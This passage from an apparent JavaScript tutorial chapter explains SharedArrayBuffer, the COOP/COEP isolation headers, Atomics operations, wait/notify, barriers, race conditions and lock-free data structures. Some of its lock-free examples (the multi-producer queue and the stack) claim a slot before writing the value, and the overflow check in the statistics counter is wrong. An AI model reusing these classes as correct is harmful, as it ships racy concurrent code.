  const writeIdx = Atomics.load(sharedArray, WRITE_INDEX);
  const readIdx = Atomics.load(sharedArray, READ_INDEX);
  
  // Check if buffer is full
  const nextWrite = (writeIdx + 1) % BUFFER_SIZE;
  if (nextWrite === readIdx) {
    console.log('Buffer full, waiting...');
    return;
  }
  
  // Write data
  const value = produced++;
  const bufferIndex = BUFFER_START + writeIdx;
  Atomics.store(sharedArray, bufferIndex, value);
  
  // Update write index
  Atomics.store(sharedArray, WRITE_INDEX, nextWrite);
  
  console.log('Produced:', value);
}, 100);
```

**Consumer Worker:**

```javascript
// consumer-worker.js

const WRITE_INDEX = 0;
const READ_INDEX = 1;
const BUFFER_START = 2;
const BUFFER_SIZE = 10;

let sharedArray;

self.addEventListener('message', (event) => {
  sharedArray = new Int32Array(event.data.sharedBuffer);
  
  // Consumer: Read from buffer
  setInterval(() => {
    const writeIdx = Atomics.load(sharedArray, WRITE_INDEX);
    const readIdx = Atomics.load(sharedArray, READ_INDEX);
    
    // Check if buffer is empty
    if (readIdx === writeIdx) {
      console.log('Buffer empty, waiting...');
      return;
    }
    
    // Read data
    const bufferIndex = BUFFER_START + readIdx;
    const value = Atomics.load(sharedArray, bufferIndex);
    
    // Update read index
    const nextRead = (readIdx + 1) % BUFFER_SIZE;
    Atomics.store(sharedArray, READ_INDEX, nextRead);
    
    console.log('Consumed:', value);
  }, 150);
});
```

### Security Considerations (COOP/COEP Headers)

SharedArrayBuffer requires specific HTTP headers due to security concerns (Spectre vulnerability).

**Required Headers:**

```javascript
// Server must send these headers:

// Cross-Origin-Opener-Policy (COOP)
// Isolates the browsing context
'Cross-Origin-Opener-Policy': 'same-origin'

// Cross-Origin-Embedder-Policy (COEP)
// Ensures all resources are loaded with CORS or from same origin
'Cross-Origin-Embedder-Policy': 'require-corp'

// Example in Node.js Express:
const express = require('express');
const app = express();

app.use((req, res, next) => {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
  next();
});

app.use(express.static('public'));

app.listen(3000);
```

**Checking if SharedArrayBuffer is Available:**

```javascript
function checkSharedArrayBufferSupport() {
  if (typeof SharedArrayBuffer === 'undefined') {
    console.error('SharedArrayBuffer is not available');
    console.error('This could be because:');
    console.error('1. The browser does not support it');
    console.error('2. The page is not cross-origin isolated (missing COOP/COEP headers)');
    console.error('3. The feature was disabled due to security concerns');
    return false;
  }
  
  try {
    const sab = new SharedArrayBuffer(4);
    const view = new Int32Array(sab);
    Atomics.add(view, 0, 1);
    return true;
  } catch (e) {
    console.error('SharedArrayBuffer is available but not functional:', e);
    return false;
  }
}

if (checkSharedArrayBufferSupport()) {
  console.log('SharedArrayBuffer is fully supported');
  // Proceed with shared memory code
} else {
  console.log('Falling back to non-shared memory approach');
  // Use MessageChannel or other alternatives
}
```

**Cross-Origin Resource Policy (CORP):**

```javascript
// For resources loaded from different origins,
// they must include CORP header

// Server sending resources:
'Cross-Origin-Resource-Policy': 'cross-origin'

// Or for same-site only:
'Cross-Origin-Resource-Policy': 'same-site'

// Or for same-origin only:
'Cross-Origin-Resource-Policy': 'same-origin'

// Example: Loading images or scripts
// <img src="https://example.com/image.jpg" crossorigin="anonymous">
// The server at example.com must send appropriate CORP header
```

**Feature Detection HTML:**

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>SharedArrayBuffer Test</title>
</head>
<body>
  <h1>SharedArrayBuffer Support Check</h1>
  <div id="status"></div>
  
  <script>
    const statusDiv = document.getElementById('status');
    
    function checkSupport() {
      const results = [];
      
      // Check if SharedArrayBuffer exists
      if (typeof SharedArrayBuffer !== 'undefined') {
        results.push('âœ“ SharedArrayBuffer is defined');
        
        // Try to create one
        try {
          const sab = new SharedArrayBuffer(8);
          results.push('âœ“ Can create SharedArrayBuffer');
          
          // Try atomic operations
          try {
            const view = new Int32Array(sab);
            Atomics.add(view, 0, 1);
            results.push('âœ“ Atomics operations work');
            results.push('<strong>Full support available!</strong>');
          } catch (e) {
            results.push('âœ— Atomics failed: ' + e.message);
          }
        } catch (e) {
          results.push('âœ— Cannot create SharedArrayBuffer: ' + e.message);
        }
      } else {
        results.push('âœ— SharedArrayBuffer is not defined');
        results.push('Page may not be cross-origin isolated');
        results.push('Check COOP and COEP headers');
      }
      
      // Check cross-origin isolation
      if (typeof crossOriginIsolated !== 'undefined') {
        results.push(
          crossOriginIsolated 
            ? 'âœ“ Page is cross-origin isolated' 
            : 'âœ— Page is NOT cross-origin isolated'
        );
      }
      
      statusDiv.innerHTML = results.join('<br>');
    }
    
    checkSupport();
  </script>
</body>
</html>
```

---

## 19.2 Atomics

Atomics provides atomic operations on SharedArrayBuffer, ensuring thread-safe access to shared memory.

### Atomic Operations

Atomic operations are indivisible - they complete fully or not at all, preventing race conditions.

**Why Atomics are Needed:**

```javascript
// WITHOUT ATOMICS - Race Condition
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 0;

// In Worker 1:
function incrementNonAtomic() {
  const current = view[0];  // Read
  // >>> Context switch can happen here! <<<
  view[0] = current + 1;    // Write
}

// In Worker 2:
function incrementNonAtomic() {
  const current = view[0];  // Read
  // >>> Context switch can happen here! <<<
  view[0] = current + 1;    // Write
}

// Race condition example:
// Worker 1 reads: 0
// Worker 2 reads: 0
// Worker 1 writes: 1
// Worker 2 writes: 1
// Result: 1 (should be 2!)

// WITH ATOMICS - No Race Condition
function incrementAtomic() {
  Atomics.add(view, 0, 1); // Atomic read-modify-write
}

// Both workers increment atomically
// Result: 2 (correct!)
```

**Atomic Operations Overview:**

```javascript
const sab = new SharedArrayBuffer(16);
const view = new Int32Array(sab);

// Initialize
view[0] = 10;
view[1] = 5;
view[2] = 0xFF;

// Atomics provide atomic operations:
// - Add, subtract, and, or, xor
// - Compare and exchange
// - Load and store
// - Wait and notify

console.log('Initial values:', view[0], view[1], view[2]);
```

### `Atomics.add()`, `Atomics.sub()`, `Atomics.and()`, etc.

Atomic arithmetic and bitwise operations.

**`Atomics.add()` - Atomic Addition:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 10;

// Returns old value, stores new value
const oldValue = Atomics.add(view, 0, 5);

console.log('Old value:', oldValue);    // 10
console.log('New value:', view[0]);     // 15

// Multiple workers can safely increment
// main.js
const worker1 = new Worker('worker.js');
const worker2 = new Worker('worker.js');

worker1.postMessage({ sab, iterations: 1000 });
worker2.postMessage({ sab, iterations: 1000 });

// After both workers complete, view[0] will be 10 + 2000 = 2010
```

**`Atomics.sub()` - Atomic Subtraction:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 100;

const oldValue = Atomics.sub(view, 0, 30);

console.log('Old value:', oldValue);    // 100
console.log('New value:', view[0]);     // 70

// Useful for counters, resource tracking
function decrementResource(view, index) {
  const remaining = Atomics.sub(view, index, 1);
  
  if (remaining <= 0) {
    console.log('Resources depleted!');
    return false;
  }
  
  return true;
}
```

**`Atomics.and()` - Atomic Bitwise AND:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 0b11111111; // 255

// Clear specific bits atomically
const oldValue = Atomics.and(view, 0, 0b11110000);

console.log('Old value:', oldValue.toString(2));  // 11111111
console.log('New value:', view[0].toString(2));   // 11110000

// Use case: Clearing flags
const FLAGS = {
  READY: 1 << 0,      // 0001
  RUNNING: 1 << 1,    // 0010
  ERROR: 1 << 2,      // 0100
  DONE: 1 << 3        // 1000
};

view[0] = FLAGS.READY | FLAGS.RUNNING; // 0011

// Clear RUNNING flag
Atomics.and(view, 0, ~FLAGS.RUNNING);
console.log('Flags after clear:', view[0].toString(2)); // 0001
```

**`Atomics.or()` - Atomic Bitwise OR:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 0b00001111;

// Set specific bits atomically
const oldValue = Atomics.or(view, 0, 0b11110000);

console.log('Old value:', oldValue.toString(2));  // 00001111
console.log('New value:', view[0].toString(2));   // 11111111

// Use case: Setting flags
const FLAGS = {
  INITIALIZED: 1 << 0,
  CONNECTED: 1 << 1,
  AUTHENTICATED: 1 << 2,
  READY: 1 << 3
};

view[0] = 0;

// Worker 1 sets INITIALIZED
Atomics.or(view, 0, FLAGS.INITIALIZED);

// Worker 2 sets CONNECTED
Atomics.or(view, 0, FLAGS.CONNECTED);

console.log('Combined flags:', view[0].toString(2)); // 0011
```

**`Atomics.xor()` - Atomic Bitwise XOR:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 0b10101010;

// Toggle bits atomically
const oldValue = Atomics.xor(view, 0, 0b11110000);

console.log('Old value:', oldValue.toString(2));  // 10101010
console.log('New value:', view[0].toString(2));   // 01011010

// Use case: Toggle flags
function toggleFlag(view, index, flag) {
  return Atomics.xor(view, index, flag);
}

const PAUSE_FLAG = 1 << 0;
view[0] = 0;

// Toggle pause on
toggleFlag(view, 0, PAUSE_FLAG);
console.log('Paused:', (view[0] & PAUSE_FLAG) !== 0); // true

// Toggle pause off
toggleFlag(view, 0, PAUSE_FLAG);
console.log('Paused:', (view[0] & PAUSE_FLAG) !== 0); // false
```

**`Atomics.exchange()` - Atomic Exchange:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 100;

// Atomically replace value and return old value
const oldValue = Atomics.exchange(view, 0, 200);

console.log('Old value:', oldValue);  // 100
console.log('New value:', view[0]);   // 200

// Use case: Take ownership
function tryAcquireLock(view, lockIndex, workerID) {
  const UNLOCKED = 0;
  
  // Try to exchange UNLOCKED with our ID
  const oldValue = Atomics.exchange(view, lockIndex, workerID);
  
  if (oldValue === UNLOCKED) {
    console.log(`Worker ${workerID} acquired lock`);
    return true;
  } else {
    console.log(`Lock held by worker ${oldValue}`);
    return false;
  }
}
```

**`Atomics.compareExchange()` - Compare and Exchange:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 100;

// Only exchange if current value matches expected
// Atomics.compareExchange(view, index, expectedValue, newValue)
const oldValue = Atomics.compareExchange(view, 0, 100, 200);

console.log('Old value:', oldValue);  // 100
console.log('New value:', view[0]);   // 200 (exchange succeeded)

// Try again with wrong expected value
const oldValue2 = Atomics.compareExchange(view, 0, 100, 300);

console.log('Old value:', oldValue2); // 200 (exchange failed)
console.log('New value:', view[0]);   // 200 (unchanged)

// Use case: Lock-free algorithms
function incrementWithCAS(view, index) {
  let oldValue, newValue;
  do {
    oldValue = Atomics.load(view, index);
    newValue = oldValue + 1;
  } while (Atomics.compareExchange(view, index, oldValue, newValue) !== oldValue);
  
  return newValue;
}
```

### `Atomics.load()` / `Atomics.store()`

Atomic read and write operations.

**`Atomics.load()` - Atomic Read:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);
view[0] = 42;

// Atomic load ensures you read a complete value
const value = Atomics.load(view, 0);
console.log('Loaded:', value); // 42

// Without Atomics.load on some architectures,
// a non-atomic read might see a partial write
// (though JavaScript engines typically ensure this)

// Use case: Safely reading shared state
function getSharedState(sharedView, stateIndex) {
  return Atomics.load(sharedView, stateIndex);
}
```

**`Atomics.store()` - Atomic Write:**

```javascript
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);

// Atomic store ensures the value is fully written
Atomics.store(view, 0, 42);

console.log('Stored:', view[0]); // 42

// Returns the value that was stored
const stored = Atomics.store(view, 0, 100);
console.log('Stored value:', stored); // 100

// Use case: Publishing shared state
function setSharedState(sharedView, stateIndex, newState) {
  Atomics.store(sharedView, stateIndex, newState);
}
```

**Memory Ordering Guarantees:**

```javascript
const sab = new SharedArrayBuffer(8);
const view = new Int32Array(sab);

// Atomics provide sequential consistency
// Operations appear to happen in program order

// Thread 1:
Atomics.store(view, 0, 1);  // A
Atomics.store(view, 1, 2);  // B

// Thread 2:
const b = Atomics.load(view, 1); // C
const a = Atomics.load(view, 0); // D

// If C sees value 2 (from B), then D must see value 1 (from A)
// This ordering is guaranteed

// Without atomics, reordering could occur
```

### `Atomics.wait()` / `Atomics.notify()`

Atomic waiting and notification for thread synchronization.

**`Atomics.wait()` - Wait for Value Change:**

```javascript
// Can only be used on Int32Array or BigInt64Array
// Cannot be used on main thread (would block UI)

// worker.js
const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);

// Wait for value at index 0 to change from 0
// Atomics.wait(typedArray, index, expectedValue, timeout)
console.log('Waiting for signal...');

const result = Atomics.wait(view, 0, 0, 5000); // 5 second timeout

if (result === 'ok') {
  console.log('Woken up by notify');
} else if (result === 'not-equal') {
  console.log('Value already changed');
} else if (result === 'timed-out') {
  console.log('Wait timed out');
}

console.log('Value is now:', view[0]);
```

**`Atomics.notify()` - Wake Waiting Threads:**

```javascript
// main.js or another worker

const sab = new SharedArrayBuffer(4);
const view = new Int32Array(sab);

// Change value and notify waiters
Atomics.store(view, 0, 1);

// Atomics.notify(typedArray, index, count)
// count: number of waiters to wake (default: Infinity)
const wokenCount = Atomics.notify(view, 0, 1);

console.log('Woke up', wokenCount, 'waiter(s)');
```

**Producer-Consumer with Wait/Notify:**

```javascript
// shared-queue.js - Shared structure

class SharedQueue {
  constructor(capacity = 10) {
    // Layout: [readIndex, writeIndex, count, ...data]
    const bufferSize = 3 + capacity;
    this.sab = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT * bufferSize);
    this.view = new Int32Array(this.sab);
    this.capacity = capacity;
    
    this.READ_INDEX = 0;
    this.WRITE_INDEX = 1;
    this.COUNT = 2;
    this.DATA_START = 3;
    
    Atomics.store(this.view, this.READ_INDEX, 0);
    Atomics.store(this.view, this.WRITE_INDEX, 0);
    Atomics.store(this.view, this.COUNT, 0);
  }
  
  getSharedBuffer() {
    return this.sab;
  }
}

// producer-worker.js
let view, capacity, DATA_START, WRITE_INDEX, COUNT;

self.addEventListener('message', (event) => {
  const sab = event.data.sharedBuffer;
  capacity = event.data.capacity;
  view = new Int32Array(sab);
  
  DATA_START = 3;
  WRITE_INDEX = 1;
  COUNT = 2;
  
  startProducing();
});

function startProducing() {
  let produced = 0;
  
  setInterval(() => {
    // Wait if queue is full
    while (Atomics.load(view, COUNT) >= capacity) {
      console.log('Queue full, waiting...');
      Atomics.wait(view, COUNT, capacity, 1000);
    }
    
    // Produce item
    const writeIdx = Atomics.load(view, WRITE_INDEX);
    const dataIndex = DATA_START + writeIdx;
    
    Atomics.store(view, dataIndex, produced);
    
    // Update write index
    const nextWrite = (writeIdx + 1) % capacity;
    Atomics.store(view, WRITE_INDEX, nextWrite);
    
    // Increment count
    Atomics.add(view, COUNT, 1);
    
    // Notify consumers
    Atomics.notify(view, COUNT, 1);
    
    console.log('Produced:', produced);
    produced++;
  }, 100);
}

// consumer-worker.js
let view, capacity, DATA_START, READ_INDEX, COUNT;

self.addEventListener('message', (event) => {
  const sab = event.data.sharedBuffer;
  capacity = event.data.capacity;
  view = new Int32Array(sab);
  
  DATA_START = 3;
  READ_INDEX = 0;
  COUNT = 2;
  
  startConsuming();
});

function startConsuming() {
  setInterval(() => {
    // Wait if queue is empty
    while (Atomics.load(view, COUNT) === 0) {
      console.log('Queue empty, waiting...');
      Atomics.wait(view, COUNT, 0, 1000);
    }
    
    // Consume item
    const readIdx = Atomics.load(view, READ_INDEX);
    const dataIndex = DATA_START + readIdx;
    
    const value = Atomics.load(view, dataIndex);
    
    // Update read index
    const nextRead = (readIdx + 1) % capacity;
    Atomics.store(view, READ_INDEX, nextRead);
    
    // Decrement count
    Atomics.sub(view, COUNT, 1);
    
    // Notify producers
    Atomics.notify(view, COUNT, 1);
    
    console.log('Consumed:', value);
  }, 150);
}
```

**Barrier Synchronization:**

```javascript
// Barrier: Wait for all workers to reach a point

class Barrier {
  constructor(numWorkers) {
    // Layout: [count, generation]
    this.sab = new SharedArrayBuffer(8);
    this.view = new Int32Array(this.sab);
    this.numWorkers = numWorkers;
    
    this.COUNT = 0;
    this.GENERATION = 1;
    
    Atomics.store(this.view, this.COUNT, 0);
    Atomics.store(this.view, this.GENERATION, 0);
  }
  
  getSharedBuffer() {
    return this.sab;
  }
}

// worker.js
let barrierView, numWorkers;

self.addEventListener('message', (event) => {
  barrierView = new Int32Array(event.data.barrier);
  numWorkers = event.data.numWorkers;
  
  doWork();
});

function doWork() {
  // Phase 1
  console.log('Phase 1 work...');
  // ... do work ...
  
  // Wait at barrier
  waitAtBarrier();
  
  // Phase 2 (all workers synchronized)
  console.log('Phase 2 work...');
  // ... do work ...
}

function waitAtBarrier() {
  const COUNT = 0;
  const GENERATION = 1;
  
  const gen = Atomics.load(barrierView, GENERATION);
  
  // Increment count
  const arrived = Atomics.add(barrierView, COUNT, 1) + 1;
  
  if (arrived === numWorkers) {
    // Last worker to arrive
    // Reset count and advance generation
    Atomics.store(barrierView, COUNT, 0);
    Atomics.add(barrierView, GENERATION, 1);
    
    // Wake all waiting workers
    Atomics.notify(barrierView, GENERATION, numWorkers - 1);
  } else {
    // Wait for all workers to arrive
    Atomics.wait(barrierView, GENERATION, gen);
  }
}
```

### `Atomics.isLockFree()`

Checks if atomic operations on a given size are lock-free (faster).

**Basic Usage:**

```javascript
// Check if operations on different sizes are lock-free
console.log('1 byte:', Atomics.isLockFree(1));  // Usually true
console.log('2 bytes:', Atomics.isLockFree(2)); // Usually true
console.log('4 bytes:', Atomics.isLockFree(4)); // Usually true (Int32)
console.log('8 bytes:', Atomics.isLockFree(8)); // Platform-dependent (BigInt64)

// Lock-free means the operation doesn't require locks
// and is implemented with CPU atomic instructions
// This is faster and more efficient

// Use this to choose optimal data types
function chooseOptimalType() {
  if (Atomics.isLockFree(8)) {
    console.log('Use BigInt64Array for best performance');
    return BigInt64Array;
  } else if (Atomics.isLockFree(4)) {
    console.log('Use Int32Array for best performance');
    return Int32Array;
  } else {
    console.log('Fall back to Int32Array');
    return Int32Array;
  }
}

const OptimalArray = chooseOptimalType();
```

**Performance Implications:**

```javascript
// Lock-free operations are faster
const sab = new SharedArrayBuffer(8);

// Int32Array (4 bytes) - usually lock-free
const int32View = new Int32Array(sab);
console.log('Int32 lock-free:', Atomics.isLockFree(4));

// BigInt64Array (8 bytes) - may not be lock-free on all platforms
const bigInt64View = new BigInt64Array(sab, 0, 1);
console.log('BigInt64 lock-free:', Atomics.isLockFree(8));

// Benchmark
function benchmark(view, operations) {
  const start = performance.now();
  
  for (let i = 0; i < operations; i++) {
    Atomics.add(view, 0, 1);
  }
  
  const end = performance.now();
  return end - start;
}

// If lock-free, atomic operations are very fast
// If not lock-free, operations may use locks (slower)
```

### Use Cases (Multi-threaded Coordination)

Practical applications of Atomics and SharedArrayBuffer.

**1. Parallel Image Processing:**

```javascript
// main.js
async function processImageParallel(imageData, numWorkers = 4) {
  const width = imageData.width;
  const height = imageData.height;
  
  // Create shared buffer for image data
  const sab = new SharedArrayBuffer(imageData.data.length);
  const sharedArray = new Uint8ClampedArray(sab);
  
  // Copy image data to shared buffer
  sharedArray.set(imageData.data);
  
  // Create workers
  const workers = [];
  const rowsPerWorker = Math.ceil(height / numWorkers);
  
  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker('image-worker.js');
    workers.push(worker);
    
    const startRow = i * rowsPerWorker;
    const endRow = Math.min((i + 1) * rowsPerWorker, height);
    
    worker.postMessage({
      sharedBuffer: sab,
      width,
      height,
      startRow,
      endRow
    });
  }
  
  // Wait for all workers to complete
  await Promise.all(workers.map(worker => 
    new Promise(resolve => worker.addEventListener('message', resolve))
  ));
  
  // Copy processed data back
  imageData.data.set(sharedArray);
  
  // Terminate workers
  workers.forEach(w => w.terminate());
  
  return imageData;
}

// image-worker.js
self.addEventListener('message', (event) => {
  const { sharedBuffer, width, height, startRow, endRow } = event.data;
  const pixels = new Uint8ClampedArray(sharedBuffer);
  
  // Process rows assigned to this worker
  for (let y = startRow; y < endRow; y++) {
    for (let x = 0; x < width; x++) {
      const index = (y * width + x) * 4;
      
      // Apply grayscale filter
      const r = pixels[index];
      const g = pixels[index + 1];
      const b = pixels[index + 2];
      
      const gray = 0.299 * r + 0.587 * g + 0.114 * b;
      
      pixels[index] = gray;
      pixels[index + 1] = gray;
      pixels[index + 2] = gray;
      // Alpha (index + 3) unchanged
    }
  }
  
  self.postMessage({ done: true });
});
```

**2. Lock-Free Queue:**

```javascript
class LockFreeQueue {
  constructor(capacity) {
    // Ring buffer: [head, tail, ...data]
    const bufferSize = 2 + capacity;
    this.sab = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT * bufferSize);
    this.view = new Int32Array(this.sab);
    this.capacity = capacity;
    
    Atomics.store(this.view, 0, 0); // head
    Atomics.store(this.view, 1, 0); // tail
  }
  
  enqueue(value) {
    while (true) {
      const head = Atomics.load(this.view, 0);
      const tail = Atomics.load(this.view, 1);
      const next = (tail + 1) % this.capacity;
      
      // Queue full?
      if (next === head) {
        return false;
      }
      
      // Try to advance tail
      if (Atomics.compareExchange(this.view, 1, tail, next) === tail) {
        // Successfully claimed spot
        Atomics.store(this.view, 2 + tail, value);
        return true;
      }
      // CAS failed, retry
    }
  }
  
  dequeue() {
    while (true) {
      const head = Atomics.load(this.view, 0);
      const tail = Atomics.load(this.view, 1);
      
      // Queue empty?
      if (head === tail) {
        return null;
      }
      
      const value = Atomics.load(this.view, 2 + head);
      const next = (head + 1) % this.capacity;
      
      // Try to advance head
      if (Atomics.compareExchange(this.view, 0, head, next) === head) {
        return value;
      }
      // CAS failed, retry
    }
  }
}
```

**3. Spinlock Implementation:**

```javascript
class Spinlock {
  constructor() {
    this.sab = new SharedArrayBuffer(4);
    this.view = new Int32Array(this.sab);
    Atomics.store(this.view, 0, 0); // 0 = unlocked
  }
  
  lock() {
    // Spin until we acquire the lock
    while (Atomics.compareExchange(this.view, 0, 0, 1) !== 0) {
      // Busy wait
      // In production, add yield or backoff
    }
  }
  
  unlock() {
    Atomics.store(this.view, 0, 0);
  }
  
  tryLock() {
    return Atomics.compareExchange(this.view, 0, 0, 1) === 0;
  }
  
  withLock(callback) {
    this.lock();
    try {
      return callback();
    } finally {
      this.unlock();
    }
  }
}

// Usage
const lock = new Spinlock();

// In worker:
lock.withLock(() => {
  // Critical section - only one worker at a time
  console.log('In critical section');
  // Modify shared state safely
});
```

**4. Parallel Array Sum:**

```javascript
// main.js
async function parallelSum(array, numWorkers = 4) {
  const chunkSize = Math.ceil(array.length / numWorkers);
  
  // Create shared buffer for results
  const resultBuffer = new SharedArrayBuffer(
    Int32Array.BYTES_PER_ELEMENT * numWorkers
  );
  const results = new Int32Array(resultBuffer);
  
  // Create shared buffer for input
  const dataBuffer = new SharedArrayBuffer(
    Int32Array.BYTES_PER_ELEMENT * array.length
  );
  const sharedData = new Int32Array(dataBuffer);
  sharedData.set(array);
  
  // Create workers
  const workers = [];
  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker('sum-worker.js');
    workers.push(worker);
    
    const start = i * chunkSize;
    const end = Math.min((i + 1) * chunkSize, array.length);
    
    worker.postMessage({
      data: dataBuffer,
      results: resultBuffer,
      workerIndex: i,
      start,
      end
    });
  }
  
  // Wait for all workers
  await Promise.all(workers.map(w => 
    new Promise(resolve => w.addEventListener('message', resolve))
  ));
  
  // Sum partial results
  let total = 0;
  for (let i = 0; i < numWorkers; i++) {
    total += results[i];
  }
  
  workers.forEach(w => w.terminate());
  
  return total;
}

// sum-worker.js
self.addEventListener('message', (event) => {
  const { data, results, workerIndex, start, end } = event.data;
  
  const sharedData = new Int32Array(data);
  const sharedResults = new Int32Array(results);
  
  // Compute partial sum
  let sum = 0;
  for (let i = start; i < end; i++) {
    sum += sharedData[i];
  }
  
  // Store result atomically
  Atomics.store(sharedResults, workerIndex, sum);
  
  self.postMessage({ done: true });
});

// Usage
const largeArray = new Array(10000000).fill(1);
parallelSum(largeArray, 4).then(sum => {
  console.log('Sum:', sum); // 10000000
});
```

---

## 19.3 Race Conditions Deep Dive

Race conditions are the most common bugs in concurrent programming. Understanding them is essential for writing correct multi-threaded code.

### The Classic Race Condition

```javascript
// The "lost update" problem - most common race condition

// Shared state
const sab = new SharedArrayBuffer(4);
const counter = new Int32Array(sab);
counter[0] = 0;

// Worker A                    | Worker B
// --------------------------- | ---------------------------
// read counter[0] â†’ 0         |
//                             | read counter[0] â†’ 0
// compute 0 + 1 = 1           |
//                             | compute 0 + 1 = 1
// write counter[0] = 1        |
//                             | write counter[0] = 1
// 
// RESULT: counter[0] = 1 (should be 2!)
// Both increments "lost" one update

// âŒ NON-ATOMIC: Race condition
function incrementBad(arr, index) {
  arr[index] = arr[index] + 1;  // Read + Write = TWO operations
}

// âœ… ATOMIC: No race condition
function incrementGood(arr, index) {
  Atomics.add(arr, index, 1);  // Read + Modify + Write = ONE atomic operation
}
```

### Check-Then-Act Race Condition

```javascript
// Another classic: "check-then-act" pattern

// âŒ WRONG: Non-atomic check-then-act
function reserveSeatBad(seats, seatNumber) {
  if (seats[seatNumber] === 0) {  // Check if available
    // >>> RACE WINDOW: Another thread could reserve here! <<<
    seats[seatNumber] = 1;        // Reserve
    return true;
  }
  return false;
}

// âœ… CORRECT: Atomic compare-and-exchange
function reserveSeatGood(seats, seatNumber) {
  // Atomically: if seats[seatNumber] === 0, set it to 1
  const result = Atomics.compareExchange(seats, seatNumber, 0, 1);
  return result === 0;  // Returns true only if WE got the seat
}

// Usage
const sab = new SharedArrayBuffer(100 * 4);  // 100 seats
const seats = new Int32Array(sab);

// Multiple workers can safely reserve seats
const gotSeat = reserveSeatGood(seats, 42);
console.log(gotSeat ? 'Reserved seat 42!' : 'Seat 42 taken');
```

### Read-Modify-Write Patterns

```javascript
// Common patterns that REQUIRE atomic operations

// 1. COUNTER
// âŒ Bad: count++ is read-modify-write (not atomic)
// âœ… Good: Atomics.add(arr, idx, 1)

// 2. FLAG TOGGLE
// âŒ Bad: flag = !flag
// âœ… Good: Atomics.xor(arr, idx, 1)  // Toggle between 0 and 1

// 3. MAXIMUM TRACKING
// âŒ Bad: if (value > max) max = value
// âœ… Good:
function atomicMax(arr, idx, value) {
  let current = Atomics.load(arr, idx);
  while (value > current) {
    const oldValue = Atomics.compareExchange(arr, idx, current, value);
    if (oldValue === current) return value;  // Success
    current = oldValue;  // Someone else updated, retry
  }
  return current;
}

// 4. MINIMUM TRACKING
function atomicMin(arr, idx, value) {
  let current = Atomics.load(arr, idx);
  while (value < current) {
    const oldValue = Atomics.compareExchange(arr, idx, current, value);
    if (oldValue === current) return value;
    current = oldValue;
  }
  return current;
}
```

---

## 19.4 Lock-Free Data Structures

Lock-free algorithms avoid mutexes entirely, using atomic operations for synchronization. They provide better performance and avoid deadlocks.

### Lock-Free Stack (LIFO)

```javascript
// Lock-free stack using compare-and-swap
class LockFreeStack {
  constructor(capacity = 1000) {
    // Layout: [top_index, ...elements]
    this.sab = new SharedArrayBuffer((capacity + 1) * 4);
    this.arr = new Int32Array(this.sab);
    this.capacity = capacity;
    
    // top_index at position 0, elements start at position 1
    Atomics.store(this.arr, 0, 0);  // Stack is empty
  }
  
  push(value) {
    while (true) {
      const top = Atomics.load(this.arr, 0);
      if (top >= this.capacity) return false;  // Stack full
      
      // Try to claim the slot
      const oldTop = Atomics.compareExchange(this.arr, 0, top, top + 1);
      if (oldTop === top) {
        // We claimed slot [top + 1], now write the value
        Atomics.store(this.arr, top + 1, value);
        return true;
      }
      // Another thread pushed, retry
    }
  }
  
  pop() {
    while (true) {
      const top = Atomics.load(this.arr, 0);
      if (top === 0) return undefined;  // Stack empty
      
      // Read the value first (before decrementing)
      const value = Atomics.load(this.arr, top);
      
      // Try to decrement top
      const oldTop = Atomics.compareExchange(this.arr, 0, top, top - 1);
      if (oldTop === top) {
        return value;  // Success
      }
      // Another thread popped, retry
    }
  }
}
```

### Lock-Free Queue (FIFO)

```javascript
// Lock-free single-producer single-consumer (SPSC) queue
// Most efficient for producer-consumer pattern
class SPSCQueue {
  constructor(capacity = 1024) {
    // Layout: [head, tail, ...elements]
    // Head: read position (consumer)
    // Tail: write position (producer)
    this.sab = new SharedArrayBuffer((capacity + 2) * 4);
    this.arr = new Int32Array(this.sab);
    this.capacity = capacity;
    
    Atomics.store(this.arr, 0, 0);  // head = 0
    Atomics.store(this.arr, 1, 0);  // tail = 0
  }
  
  // Called only by producer
  enqueue(value) {
    const tail = Atomics.load(this.arr, 1);
    const nextTail = (tail + 1) % this.capacity;
    const head = Atomics.load(this.arr, 0);
    
    if (nextTail === head) return false;  // Queue full
    
    Atomics.store(this.arr, tail + 2, value);  // Write element
    Atomics.store(this.arr, 1, nextTail);      // Update tail
    return true;
  }
  
  // Called only by consumer
  dequeue() {
    const head = Atomics.load(this.arr, 0);
    const tail = Atomics.load(this.arr, 1);
    
    if (head === tail) return undefined;  // Queue empty
    
    const value = Atomics.load(this.arr, head + 2);  // Read element
    const nextHead = (head + 1) % this.capacity;
    Atomics.store(this.arr, 0, nextHead);  // Update head
    return value;
  }
}
```

### Lock-Free Counter with Statistics

```javascript
// High-performance counter that tracks min, max, and count
class AtomicStats {
  constructor() {
    // Layout: [count, sum_lo, sum_hi, min, max]
    this.sab = new SharedArrayBuffer(5 * 4);
    this.arr = new Int32Array(this.sab);
    
    Atomics.store(this.arr, 0, 0);           // count
    Atomics.store(this.arr, 1, 0);           // sum_lo
    Atomics.store(this.arr, 2, 0);           // sum_hi
    Atomics.store(this.arr, 3, 2147483647);  // min (MAX_INT)
    Atomics.store(this.arr, 4, -2147483648); // max (MIN_INT)
  }
  
  record(value) {
    // Increment count
    Atomics.add(this.arr, 0, 1);
    
    // Add to sum (handling overflow into sum_hi)
    const lo = Atomics.add(this.arr, 1, value);
    if (value > 0 && lo < value) Atomics.add(this.arr, 2, 1);  // Overflow
    
